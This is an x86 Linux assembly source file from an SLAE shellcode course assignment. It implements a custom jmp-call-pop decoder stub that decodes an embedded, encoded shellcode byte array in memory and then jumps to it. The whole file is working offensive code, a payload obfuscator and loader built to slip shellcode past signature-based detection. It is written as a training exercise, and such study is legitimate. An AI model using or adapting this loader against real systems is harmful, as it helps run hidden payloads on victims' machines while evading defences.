; SLAE - Assignment 4: Custom encoder/decoder shellcode (Linux/x86)
; Author: Alain Menelet 
; StudentID - SLAE-3763
; Tested on Ubuntu 16.14.03 LTS


global _start

section .text

_start:
	jmp short Shellcode					; jmp pop call technique

decoder:
	pop esi							; esi = @ of the shellcode
	push esi						; save esi on the stack
	mov edi, esi						; edi = esi because we use two offset for our algo
	xor ecx,ecx						; ecx is set to 0
	mul ecx							; edx, eax are set to 0
	
	mov cl, 0x17						; set the length of the shellcode
	
	
_:	
	xor eax, eax						; set eax, ebx, ecx to 0 each turn during the loop
	xor ebx, ebx
	xor edx, edx

	mov byte al, [edi]					; set al with the first byte of the shellcode
	cmp al, 0xff						; al == 0xFF ? 
	jz impair						; if the shellcode len is odd we jump to label impair

	mov byte dl, [edi+1]					; set dl with the second byte of the shellcode
	sub dl, al						; we substract dl with al
	mov byte bl, [edi+2]					; set bl with the third byte of the shellcode
	sub bl, al						; we substract bl with al
	xor dl, bl						; xor dl and bl
	mov [esi], dl						; then we put dl and bl decoded
	mov [esi+1], bl


	inc esi							; because we use esi and edi as offset, we need to increment them
	inc esi
	inc edi
	inc edi
	inc edi

	loop _							; loop while ecx > 0
	jmp short final
	
impair:
	mov byte bl, [edi+1]					; set bl with the first byte after 0xFF
	mov byte dl, [edi+2]					; set dl with the second byte after 0xFF
	xor bl, dl
	mov [esi], bl						; we store the decoded byte into esi

final:
	call [esp]						; we jump to the address pointed by esp, our saved esi.	

Shellcode:
	call decoder
	shell: db 0x03,0xfb,0xcc,0x04,0x1a,0xe5,0x03,0x45,0xce,0x05,0x2e,0xb5,0x02,0x6b,0xcf,0x01,0x78,0xf8,0x08,0xb8,0x59,0x0a,0x51,0x39,0x0a,0x66,0x7d,0x03,0x03,0x6b,0x03,0x50,0x65,0x06,0x0d,0x74,0x06,0x70,0xe9,0x0a,0xe2,0x93,0x08,0xb9,0x5b,0x03,0x6b,0xe4,0x02,0xbd,0x0d,0x09,0x56,0x89
